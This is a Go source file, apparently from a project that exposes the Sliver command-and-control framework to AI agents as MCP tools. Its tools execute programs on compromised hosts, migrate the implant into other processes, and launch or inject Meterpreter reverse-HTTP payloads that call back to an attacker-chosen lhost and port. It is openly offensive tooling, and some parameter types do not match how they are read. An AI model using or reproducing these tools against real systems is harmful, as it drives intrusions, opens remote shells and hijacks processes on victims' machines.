package mcptools_sliver_cmd

import (
	"context"
	"fmt"

	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/golang/protobuf/proto"
	"github.com/mark3labs/mcp-go/mcp"
	sliver_client "github.com/xsxz/sliver-mcp/sliver/client"
	cmd "github.com/xsxz/sliver-mcp/sliver/client/command"
	"github.com/xsxz/sliver-mcp/utils"
)

const (
	Execute   = "session_run_execute"
	Migrate   = "session_run_migrate"
	Msf       = "session_run_msf"
	MsfInject = "session_run_msf_inject"
)

var ExecuteTool = mcp.NewTool(
	Execute,
	mcp.WithDescription("by session ID"),
	mcp.WithString("session_id", mcp.Required()),
	mcp.WithString("path", mcp.Required()),
	mcp.WithString("args", mcp.Required()),
	mcp.WithString("output", mcp.Required()),
)

func ExecuteHandle(ctx context.Context, request mcp.CallToolRequest) (*mcp.CallToolResult, error) {
	path := request.GetString("path", "")
	args := request.GetStringSlice("args", []string{})
	output := request.GetBool("output", false)
	sessionID := request.GetString("session_id", "")
	if sessionID == "" {
		return nil, fmt.Errorf("session_id is required")
	}

	client, err := sliver_client.GetClient()
	if err != nil {
		return nil, fmt.Errorf("failed to get sliver client: %w", err)
	}

	cmd := func(session *clientpb.Session) (interface{}, error) {
		return cmd.Execute(client, session, path, args, output)
	}

	result, err := client.RunInSession(sessionID, cmd)
	if err != nil {
		return nil, fmt.Errorf("failed to run command: %w", err)
	}

	jsonStrings, err := utils.ProtoMsgToJSON(result.(proto.Message))
	if err != nil {
		return nil, fmt.Errorf("failed to marshal protobuf to JSON: %w", err)
	}

	return &mcp.CallToolResult{
		Content: []mcp.Content{
			mcp.NewTextContent(jsonStrings),
		},
	}, nil
}

////
////
////

var MigrateTool = mcp.NewTool(
	Migrate,
	mcp.WithDescription("by session ID"),
	mcp.WithString("session_id", mcp.Required()),
	mcp.WithNumber("pid", mcp.Required()),
)

func MigrateHandle(ctx context.Context, request mcp.CallToolRequest) (*mcp.CallToolResult, error) {
	pid := uint32(request.GetInt("pid", 0))
	sessionID := request.GetString("session_id", "")
	if sessionID == "" {
		return nil, fmt.Errorf("session_id is required")
	}

	client, err := sliver_client.GetClient()
	if err != nil {
		return nil, fmt.Errorf("failed to get sliver client: %w", err)
	}

	cmd := func(session *clientpb.Session) (interface{}, error) {
		return cmd.Migrate(client, session, pid)
	}

	result, err := client.RunInSession(sessionID, cmd)
	if err != nil {
		return nil, fmt.Errorf("failed to run command: %w", err)
	}

	jsonStrings, err := utils.ProtoMsgToJSON(result.(proto.Message))
	if err != nil {
		return nil, fmt.Errorf("failed to marshal protobuf to JSON: %w", err)
	}

	return &mcp.CallToolResult{
		Content: []mcp.Content{
			mcp.NewTextContent(jsonStrings),
		},
	}, nil
}

////
////
////

var MsfTool = mcp.NewTool(
	Msf,
	mcp.WithDescription("by session ID"),
	mcp.WithString("session_id", mcp.Required()),
	mcp.WithString("payload", mcp.Required()),
	mcp.WithString("lhost", mcp.Required()),
	mcp.WithNumber("lport", mcp.Required()),
)

func MsfHandle(ctx context.Context, request mcp.CallToolRequest) (*mcp.CallToolResult, error) {
	payload := request.GetString("payload", "meterpreter_reverse_http")
	lhost := request.GetString("lhost", "")
	lport := int32(request.GetInt("lport", 0))

	sessionID := request.GetString("session_id", "")
	if sessionID == "" {
		return nil, fmt.Errorf("session_id is required")
	}

	client, err := sliver_client.GetClient()
	if err != nil {
		return nil, fmt.Errorf("failed to get sliver client: %w", err)
	}

	cmd := func(session *clientpb.Session) (interface{}, error) {
		return cmd.Msf(client, session, payload, lhost, lport)
	}

	result, err := client.RunInSession(sessionID, cmd)
	if err != nil {
		return nil, fmt.Errorf("failed to run command: %w", err)
	}

	jsonStrings, err := utils.ProtoMsgToJSON(result.(proto.Message))
	if err != nil {
		return nil, fmt.Errorf("failed to marshal protobuf to JSON: %w", err)
	}

	return &mcp.CallToolResult{
		Content: []mcp.Content{
			mcp.NewTextContent(jsonStrings),
		},
	}, nil
}

////
////
////

var MsfInjectTool = mcp.NewTool(
	MsfInject,
	mcp.WithDescription("by session ID"),
	mcp.WithString("session_id", mcp.Required()),
	mcp.WithString("payload", mcp.Required()),
	mcp.WithString("lhost", mcp.Required()),
	mcp.WithNumber("lport", mcp.Required()),
	mcp.WithNumber("pid", mcp.Required()),
)

func MsfInjectHandle(ctx context.Context, request mcp.CallToolRequest) (*mcp.CallToolResult, error) {
	payload := request.GetString("payload", "meterpreter_reverse_http")
	lhost := request.GetString("lhost", "")
	lport := int32(request.GetInt("lport", 0))
	pid := int32(request.GetInt("pid", 0))

	sessionID := request.GetString("session_id", "")
	if sessionID == "" {
		return nil, fmt.Errorf("session_id is required")
	}

	client, err := sliver_client.GetClient()
	if err != nil {
		return nil, fmt.Errorf("failed to get sliver client: %w", err)
	}

	cmd := func(session *clientpb.Session) (interface{}, error) {
		return cmd.MsfInject(client, session, payload, lhost, lport, pid)
	}

	result, err := client.RunInSession(sessionID, cmd)
	if err != nil {
		return nil, fmt.Errorf("failed to run command: %w", err)
	}

	jsonStrings, err := utils.ProtoMsgToJSON(result.(proto.Message))
	if err != nil {
		return nil, fmt.Errorf("failed to marshal protobuf to JSON: %w", err)
	}

	return &mcp.CallToolResult{
		Content: []mcp.Content{
			mcp.NewTextContent(jsonStrings),
		},
	}, nil
}
